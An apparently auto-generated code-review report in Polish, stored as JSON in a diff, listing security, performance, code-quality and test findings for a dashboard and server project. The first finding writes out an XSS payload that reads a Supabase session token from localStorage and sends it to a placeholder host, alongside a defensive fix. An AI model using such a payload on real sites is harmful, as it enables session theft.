@@ -1,0 +1,146 @@
+{
+ "findings": [
+  {
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/components/layout/app-layout.tsx:43",
+   "opis": "`readAcademyLink` wstawia do `<a href>` dowolny URL, który da się sparsować przez `new URL(value)`, a schematu nie sprawdza. Przechodzą więc `javascript:alert(document.cookie)`, `JavaScript:…` i `data:text/html,…`, bo konstruktor `URL` je przyjmuje. Ścieżka ataku: ktoś z dostępem do zmiennych builda w Coolify (albo literówka po wklejeniu) ustawia `VITE_AA_MARKETING_URL=javascript:fetch('//x/'+localStorage.getItem('sb-…'))`. Taki link w stopce sidebara wykonuje skrypt na `APP_ORIGIN`, gdzie w `localStorage` leży sesja Supabase. Do ataku trzeba mieć dostęp do konfiguracji builda, dlatego P3. Naprawa: po `const url = new URL(value);` dopisz `if (url.protocol !== 'https:') { Sentry.captureException(new Error('VITE_AA_MARKETING_URL bez https')); return null; }`. W `app-layout.test.tsx` dopisz test odmowy wzorowany na teście „błędny adres w konfiguracji”, ale z wartością `javascript:alert(1)`, i sprawdź `screen.queryByRole('link', { name: … })` → `null`.",
+   "_zrodlo": "security"
+  },
+  {
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/main.tsx:42",
+   "opis": "Dynamiczny `await import('./App.js')` dokłada stałe opóźnienie przy każdym zimnym starcie dashboardu: najpierw pobierają się dwa pliki, a dopiero potem trzeci. Zbudowany `apps/dashboard/dist/index.html` ma `<script src=index-*.js>` (182 900 B) i modulepreload tylko dla `preload-helper`. Chunk `App-*.js` (409 376 B: router, supabase-js, wszystkie widoki) zaczyna się pobierać dopiero po pobraniu, sparsowaniu i wykonaniu `index-*.js` razem z `initMonitoring()`. Przy każdym zimnym wejściu w panel dochodzi więc pełny RTT plus czas wykonania indexu do pierwszego renderu, na LTE zwykle 100–300 ms. Przed fazą była jedna równoległa paczka. Ta sama kolejność (monitoring przed walidacją ENV) da się osiągnąć bez kaskady, bo ES moduły wykonują się w kolejności deklaracji importów. Do zrobienia: przenieść `initMonitoring()` do modułu z efektem ubocznym `apps/dashboard/src/init-monitoring.ts` (import `@sentry/react` + `Sentry.init`, bez importu `lib/supabase`). W `main.tsx` zaimportować go jako PIERWSZY import (`import './init-monitoring.js';`), a przed nim nic, co ciągnie `lib/supabase`. Następnie przywrócić statyczny `import { App } from './App.js'` i usunąć `await import`. `lib/supabase.ts` wykona się wtedy po `Sentry.init`, a przeglądarka dostanie jeden graf modułów z modulepreload. Test z `main.test.tsx` (zdarzenie w Sentry przy braku `VITE_SUPABASE_*`) zostaje bez zmian.",
+   "_zrodlo": "performance"
+  },
+  {
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/offer/pages/aa-design.ts:50",
+   "opis": "Nowy znak `logo-aa-napis.webp` waży 79 788 B przy rozdzielczości 720×238 px, a wyświetla się w 120×40 px w stopce sidebara (`app-layout.tsx:122`). Na stronach `/` i `/prywatnosc` originu ofert (`renderAaLogo(LOGO_HEIGHT_PX)` w `root-page.ts:76` i `privacy-page.ts:148`) też jest mały. Poprzedni `logo-aa.svg` miał 4 959 B, więc każde zimne wejście na root originu ofert, na „Prywatność” i w panel pobiera około 16× więcej bajtów na znak. Plik ma 6× gęstość wyświetlania, czyli o połowę więcej niż potrzebny ekran 3× DPR. Do zrobienia: przeskalować plik do 360×119 px (3× dla 120×40) i ponownie zakodować WebP (np. `cwebp -resize 360 0 -q 85`). Ten sam plik podmienić w obu kopiach: `apps/server/static/logo-aa-napis.webp` i `apps/dashboard/src/assets/logo-aa-napis.webp`. Ścieżka `LOGO_PATH` i wpis w `REQUIRED_ASSETS` zostają bez zmian. Oczekiwany rozmiar to kilkanaście KB.",
+   "_zrodlo": "performance"
+  },
+  {
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/offers/use-offer-heat.ts:21",
+   "opis": "`const MAX_HEAT_KEYS = 1024` to trzecia kopia sufitu kluczy `heat`: jest już `MAX_HEAT_KEYS = 1_024` w apps/server/src/routes/events.ts:82 i sufit w `merge_visit_increments`, a `packages/shared/src/heat-grid.ts` eksportuje `HEAT_COLS` (16) i `MAX_GRID_ROWS` (64), z których ta wartość wynika. Na tej kopii stoi `HEAT_VISIT_LIMIT` (sufit bajtowy wejścia w widok oferty). Jeśli siatka urośnie (wystarczy zmienić `MAX_GRID_ROWS` w shared i stronę serwera), limit wizyt w dashboardzie się nie przeliczy, transfer cicho przekroczy `HEAT_TRANSFER_BUDGET_BYTES`, a typecheck niczego nie wyłapie. Learned-patterns z 01.09 mówi wprost: kontrakt trzymaj w `packages/shared`. To samo dotyczy `MAX_DRAWN_HEAT_POINTS = 2048` w heatmap-grid.ts:328, które komentarz opisuje jako 2 × 16 × 64, ale zapisano je literałem. Zmiana: dodaj w packages/shared/src/heat-grid.ts `export const MAX_HEAT_KEYS = HEAT_COLS * MAX_GRID_ROWS` (plus eksport w index.ts), zaimportuj ją w use-offer-heat.ts i events.ts zamiast lokalnych literałów, a w heatmap-grid.ts:328 wpisz `2 * MAX_HEAT_KEYS`.",
+   "_zrodlo": "code-quality"
+  },
+  {
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/settings/texts.ts:119",
+   "opis": "`WEBHOOK_TEST_REFUSAL_TEXTS` to druga definicja tego samego kontraktu odmów. Kody (`zbyt_wiele_testow`, `brak_autoryzacji`, `brak_webhooka`, `zapis_nieudany`) i ich teksty dla człowieka są już po stronie serwera: literały w apps/server/src/routes/webhook-settings.ts:131/135/265/281 i `TEXTS.testRateLimited` / `missingWebhook` / `unauthorized` w :72-77. Serwer i tak wysyła je w `envelope.error.message`, a ścieżka zapisu adresu w tym samym hooku z tego korzysta (use-webhook-settings.ts:177). Teraz te dwa komplety rozjeżdżają się już w brzmieniu („Za dużo testów pod rząd…” kontra „Test nie dotarł — za dużo testów…”). Komentarz „nowy kod po stronie serwera = nowy wpis tutaj” nie jest niczym egzekwowany: nowa odmowa serwera wróci do UI jako slug w nawiasie, a test tego nie zauważy. Do tego `statusLabel` w `webhook-state.ts:31` niesie teraz na zmianę status HTTP, „brak odpowiedzi” i kod odmowy, które rozróżnia dopiero lookup w `webhookTestFailedLabel`. Zmiana: w use-webhook-settings.ts:267 ustaw nowy wariant unii `{ status: 'refused', message: envelope.error.message ?? … }` (kod zostaje w breadcrumbie), renderuj tekst z serwera tak jak przy zapisie i usuń `WEBHOOK_TEST_REFUSAL_TEXTS` oraz `isWebhookTestRefusalCode`. Jeśli tekst ma zostać po stronie klienta, kody trzeba wynieść jako unię do `packages/shared/src/webhook-contract.ts` i użyć jej w obu miejscach (`Record<WebhookTestRefusalCode, string>`).",
+   "_zrodlo": "code-quality"
+  },
+  {
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/server/static/c.js:81",
+   "opis": "Kod `'oferta_wygasla'` istnieje w trzech niezależnych literałach: apps/server/src/routes/decisions.ts:155 (nadawca), c.js:81 (odbiorca) i cta-script.test.ts:334/348/375 (luźniejsza kopia w teście). Węzeł `msg-wygasla` jest związany z produkcją, bo test bootuje c.js na markupie z `renderCtaSection`. Kod błędu takiego wiązania nie ma: zmiana nazwy w decisions.ts sprawi, że klient po cichu wróci do ogólnego „Spróbuj ponownie”, czyli do komunikatu, który według planu „namawia na czynność, która nigdy się nie uda”. Testy c.js przejdą dalej, bo podają ten sam stary literał. c.js jest statyczny i nie może importować, więc wiązanie musi powstać w teście. Zmiana: wyeksportuj `OFFER_EXPIRED_ERROR_CODE = 'oferta_wygasla'` z apps/server/src/cta/decision-payload.ts (obok `DECISION_TEXTS`) i użyj go w decisions.ts:155. W cta-script.test.ts podawaj go do `boot({ acceptErrorCode: OFFER_EXPIRED_ERROR_CODE })` i dodaj asercję `expect(SCRIPT_SOURCE).toContain(`'${OFFER_EXPIRED_ERROR_CODE}'`)`.",
+   "_zrodlo": "code-quality"
+  },
+  {
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/components/error-boundary.tsx:14",
+   "opis": "`PRIMARY_BUTTON_CLASS` jest dosłowną kopią stałej z apps/dashboard/src/features/settings/webhook-card-status.tsx:28, o czym mówi nawet komentarz („Ten sam przycisk główny…”). Przy zmianie stylu przycisku głównego jedna kopia zostanie w tyle. Zmiana: przenieś stałą do nowego `apps/dashboard/src/components/button-classes.ts` jako `export const PRIMARY_BUTTON_CLASS` i zaimportuj ją w error-boundary.tsx i webhook-card-status.tsx. Kierunek importu jest wtedy features → components, nie odwrotny.",
+   "_zrodlo": "code-quality"
+  },
+  {
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/offers/offer-heatmap-card.tsx:250",
+   "opis": "Karta woła `offerPreviewUrl(slug)` tylko po to, żeby dostać odpowiedź tak/nie. Ta funkcja ma efekt uboczny: przy literówce w `VITE_OFFER_ORIGIN` zgłasza `Sentry.captureException`. Ten sam adres liczą też oba egzemplarze `OfferHeatmapFrame` (:143 i :162 → offer-heatmap-frame.tsx:194). Przy błędnej konfiguracji wynik to zgłoszenie przy każdym renderze karty, np. przy każdej zmianie trybu, a następna zmiana reguły budowania adresu podglądu musi trzymać zgodność trzech wywołań. Zmiana: w karcie policz raz `const previewUrl = offerPreviewUrl(slug)` (useMemo po `slug`), przy `null` zwróć `null`, a do `OfferHeatmapFrame` przekazuj `previewUrl` nowym propem `url` zamiast liczyć go w ramce z `slug` na linii 194.",
+   "_zrodlo": "code-quality"
+  },
+  {
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/offers/heatmap-grid.ts:328",
+   "opis": "heatmap-grid.ts ma już 445 linii (reguła projektu: plik > 300 = refaktoryzacja), a faza dokłada do niego kolejną odpowiedzialność, czyli politykę odsiewu punktów przed rysowaniem (`MAX_DRAWN_HEAT_POINTS` + `strongestFractions`). Ta polityka jest niezależna od dekodowania i agregacji siatki. Zmiana: przenieś `MAX_DRAWN_HEAT_POINTS` i `strongestFractions` do nowego `apps/dashboard/src/features/offers/heat-points-cap.ts` (eksport `capHeatFractions`), w `aggregatePoints` wołaj go importem, a testy sufitu przenieś do `heat-points-cap.test.ts`.",
+   "_zrodlo": "code-quality"
+  },
+  {
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/settings/use-mcp-token.ts:114",
+   "opis": "Rotacja tokenu MCP została w tej fazie przepisana na `upsert(...).select('created_at').single()`, ale zapis nadal nie ma limitu czasu. Klient Supabase w `lib/supabase.ts` nie ma globalnego timeoutu, a `generate` nie przekazuje sygnału przerwania. Scenariusz: handlowiec klika „Wygeneruj” na zawieszonym połączeniu (proxy przyjmuje żądanie i nie odpowiada) → obietnica nigdy się nie rozstrzyga → `finally { setIsBusy(false) }` się nie wykonuje → przyciski karty tokenu zostają wyłączone bez komunikatu aż do przeładowania strony. Akcja: dodaj stałą `MCP_TOKEN_WRITE_TIMEOUT_MS` (np. 15 000) i wstaw `.abortSignal(AbortSignal.timeout(MCP_TOKEN_WRITE_TIMEOUT_MS))` między `.select('created_at')` a `.single()`. Przerwanie trafi wtedy do istniejącej gałęzi `catch` (`setIsWriteFailed(true)`), a `finally` odblokuje przyciski.",
+   "_zrodlo": "correctness"
+  },
+  {
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/offers/use-offer-heat.ts:33",
+   "opis": "IU-15 / R17 („HEAT_VISIT_LIMIT przelicz na bajty, nie na wiersze”). Wykonanie: `HEAT_VISIT_LIMIT = Math.floor(HEAT_TRANSFER_BUDGET_BYTES / MAX_HEAT_ROW_BYTES)`, czyli 1 048 576 / (1024·20 + 512) = 49. To nadal limit liczby wierszy (`.limit(49)` w linii 102), tyle że policzony z najgorszego możliwego wiersza (1024 komórki). Dla typowej oferty (siatka 16×16, ok. 5 KB na wizytę) mapa składa się teraz z 49 wizyt zamiast 200, a pasek „Mapa z ostatnich {N} wizyt z {M}.” (R8, SPEC `129:64`) pojawia się już od 50. wizyty, a nie od 201. Zmiana jest widoczna dla użytkownika i odchodzi od D5 w planie fazy 5 (`docs/plans/2026-08-30-001-feat-faza-5-heatmapa-plan.md:81`: limit 200 wizyt). Akapit „Korekta po implementacji” w IU-15 nie wspomina ani nowej wartości, ani utraty dokładności. Do zrobienia jedno z dwóch: (a) liczyć budżet bajtowy na faktycznych wierszach, np. ucinać po sumie `grid_rows` albo dociągać partiami do sufitu bajtów, żeby typowe oferty zostały przy 200 wizytach; albo (b) zapisać w planie, w D5 i w akapicie korekty IU-15, że limit to teraz 49 wizyt niezależnie od gęstości, i uzyskać na to zgodę.",
+   "_zrodlo": "spec-compliance"
+  },
+  {
+   "severity": "P2",
+   "typ": "E2E",
+   "plik": "docs/active/faza-7-szablony-i-grafiki/faza-7-szablony-i-grafiki-zadania.md:423",
+   "opis": "IU-16, checkbox `Test: [E2E] dashboard-dlug-regresja` (seed `e2e/seeds/dashboard-pusty-seed.sql`) jest nadal odznaczony, a w diffie fazy nie ma śladu jego przebiegu (zrzutu ekranu ani wyniku). Scenariusz miał w przeglądarce sprawdzić dwie zmiany: przekierowanie zalogowanego z `/logowanie` (`RedirectIfAuthenticated`, apps/dashboard/src/App.tsx:196) oraz powtarzalne potwierdzenie „Kopiuj” (apps/dashboard/src/components/copy-button.tsx:444-456), przy zerze błędów w konsoli. Dziennik fazy w pliku kontekstu wymienia go jako „czeka na przebieg”. Do zrobienia: uruchomić scenariusz agentem E2E na koncie `E2E_TEST_EMAIL`, dołączyć zrzut ekranu i odznaczyć checkbox.",
+   "_zrodlo": "spec-compliance"
+  },
+  {
+   "severity": "P2",
+   "typ": "TEST",
+   "plik": "apps/dashboard/src/features/offers/use-offer-heat.test.ts:1340",
+   "opis": "Test „1000 wizyt po 1024 komórki nie przekracza sufitu bajtowego” sprawdza HEAT_VISIT_LIMIT tylko słabym matcherem `toBeGreaterThan(0)` i samoodniesieniem `state.visits.length).toBe(HEAT_VISIT_LIMIT)`. Asercja bajtowa łapie wyłącznie limit za WYSOKI. Gdyby formuła w use-offer-heat.ts:1383 dawała 1 (np. przez pomyłkę w MAX_HEAT_ROW_BYTES albo dzielenie przez budżet zamiast przez wiersz), wszystkie asercje nadal by przeszły, a mapa składałaby się z jednej wizyty. Wcześniej limit przypinało `expect(HEAT_VISIT_LIMIT).toBe(200)`, a w tej fazie tę asercję usunięto bez zamiennika. Poprawka: `expect(HEAT_VISIT_LIMIT).toBe(49)`, bo floor(1048576 / (1024·20 + 512)) = 49, oraz `expect(limit).toHaveBeenCalledWith(49)`.",
+   "_zrodlo": "test-coverage"
+  },
+  {
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "apps/server/src/routes/offer.test.ts:2567",
+   "opis": "Gałąź `candidate === '*'` w `matchesIfNoneMatch` (apps/server/src/routes/offer.ts:2722 w diffie) nie ma testu. Usunięcie jej zostawia zestaw zielony, choć RFC 9110 każe odpowiedzieć 304 na `If-None-Match: *` dla istniejącej reprezentacji. Akcja: w teście „akceptuje słabą formę i listę walidatorów” dodaj `const any = await requestOfferIfNoneMatch(app, VALID_SLUG, '*'); expect(any.status).toBe(304);`.",
+   "_zrodlo": "test-coverage"
+  },
+  {
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "apps/dashboard/src/features/settings/webhook-card.test.tsx:1644",
+   "opis": "Plan IU-16 wymaga, żeby kod odmowy został w logu: `Sentry.addBreadcrumb` w use-webhook-settings.ts:266. Żaden test tego nie sprawdza, a webhook-card.test.tsx nie atrapuje `@sentry/react`, więc usunięcie breadcrumba zostawia zestaw zielony i kod znika z diagnostyki. Akcja: dodaj `vi.mock('@sentry/react', ...)` z `addBreadcrumb: vi.fn()`, a w teście „odmowa zbyt_wiele_testow” dopisz `expect(vi.mocked(Sentry.addBreadcrumb)).toHaveBeenCalledWith({ category: 'webhook.test', message: 'zbyt_wiele_testow', level: 'info' })`.",
+   "_zrodlo": "test-coverage"
+  },
+  {
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "apps/server/src/routes/offer-origin-pages.test.ts:2418",
+   "opis": "Test „404, 503 i plansza wygaśnięcia nie wskazują starego znaku” sprawdza wyłącznie nieobecność (`not.toContain('/logo-aa.svg')`) na stronach, które w ogóle nie niosą znaku. Przechodzi więc przy każdej implementacji, także po przywróceniu `LOGO_PATH = '/logo-aa.svg'`. Akcja: zamień pętlę na asercję skorygowanego założenia z dziennika fazy, czyli że te strony nie mają `<img class=\"logo\"`: `expect(html).not.toContain('<img class=\"logo\"')`. Dopisz też, że scenariusz „wskazują nowy plik znaku” realizuje wyłącznie test `/` i `/prywatnosc` z linii 2411.",
+   "_zrodlo": "test-coverage"
+  }
+ ],
+ "przebieg": {
+  "aktywni": [
+   "security",
+   "performance",
+   "code-quality",
+   "correctness",
+   "spec-compliance",
+   "test-coverage"
+  ],
+  "pominieci": [
+   {
+    "key": "e2e",
+    "powod": "zero checkboxow [E2E] (1) i brak makiet figma_screens"
+   }
+  ],
+  "plikiKodu": 44,
+  "zrodloDossier": "domkniecie",
+  "poDedupJs": 16,
+  "poDedupSem": 16,
+  "nulle": []
+ },
+ "_run": {
+  "runId": "wf_4c4e1a73-311",
+  "status": "completed",
+  "model": "claude-opus-5-5",
+  "ms": 372119,
+  "agentow": 7,
+  "sesja": "d3be6114-b14c-5930-b03c-fb918098d5d8",
+  "katalog": "/Users/kacper_trzepiecinski/.claude/projects/-Users-kacper-trzepiecinski-test-review-p12-kopie-f-1de5a4c-stary/d3be6114-b14c-5930-b03c-fb918098d5d8"
+ }
+}
